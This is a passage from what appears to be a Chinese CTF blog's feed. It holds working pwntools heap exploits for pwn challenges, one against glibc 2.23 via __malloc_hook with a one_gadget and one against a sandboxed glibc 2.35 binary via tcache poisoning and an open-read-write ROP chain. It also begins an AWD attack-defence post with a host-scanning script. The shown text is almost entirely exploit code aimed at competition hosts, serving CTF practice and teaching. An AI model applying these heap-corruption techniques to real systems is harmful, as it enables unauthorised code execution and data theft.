punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'8.147.133.76'</span><span class="token punctuation">,</span> <span class="token number">30239</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'length'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'length'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name.'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/libc-2.23.so'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name.'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf91</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c5188</span>ogg <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf03a4</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'length'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h3><p><code>2.35</code>开了沙箱的堆</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'8.147.132.179'</span><span class="token punctuation">,</span> <span class="token number">37299</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'idx'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'idx'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'idx'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x4f0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x200</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x200</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x240</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x501</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x4f0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x340</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0xf8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x200</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x200</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span>add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x240</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4e1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x240</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>heap_base <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4e1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">b'\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x758</span> <span class="token operator">-</span> <span class="token number">0x5f0</span><span class="token punctuation">)</span>pop_rax_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000045eb0</span>pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002a3e5</span>pop_rsi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002be51</span>pop_rdx_ret_r12 <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000011f497</span>syscall_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000091396</span>pay <span class="token operator">=</span> <span class="token string">b'./flag\x00\x00'</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0x300</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0x300</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x440</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x201</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x1f0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x301</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x440</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x201</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>heap_base <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x1f0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x301</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD_PWN</title>
      <link href="/2024/04/26/awd-pwn/awd-pwn/"/>
      <url>/2024/04/26/awd-pwn/awd-pwn/</url>
      
        <content type="html"><![CDATA[<p>准备长城杯的时候练习了两周<code>awd</code>，注意力全放在<code>pwn</code>了，可惜最后没有<code>pwn</code>，全程坐牢去了…写一篇<code>awd</code>的<code>pwn</code>脚本和推荐工具吧，感谢<a href="https://www.z1r0.top/">z1r0</a>师傅的脚本和<code>cheny</code>师傅找的一些工具</p><p>视频讲解版：<a href="https://www.bilibili.com/video/BV1Fx4y1r7n2">https://www.bilibili.com/video/BV1Fx4y1r7n2</a></p><h2 id="扫描IP"><a href="#扫描IP" class="headerlink" title="扫描IP"></a>扫描IP</h2><h3 id="init-hosts-py"><a href="#init-hosts-py" class="headerlink" title="init_hosts.py"></a>init_hosts.py</h3><p>例：<a href="http://192-168-1-x.awd.bugku.cn/">http://192-168-1-X.awd.bugku.cn</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingli <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check_ip</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'http://192-168-1-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.awd.bugku.cn/'</span></span> <span class="token comment">#*</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            li<span class="token punctuation">(</span><span class="token string">'[+] '</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'hosts'</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'192-168-1-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.awd.bugku.cn:9999\n'</span></span><span class="token punctuation">)</span> <span class="token comment">#*</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Not 200 OK"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        ll<span class="token punctuation">(</span><span class="token string">'[-] '</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'192-168-1-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.awd.bugku.cn:9999\n'</span></span><span class="token punctuation">)</span> <span class="token 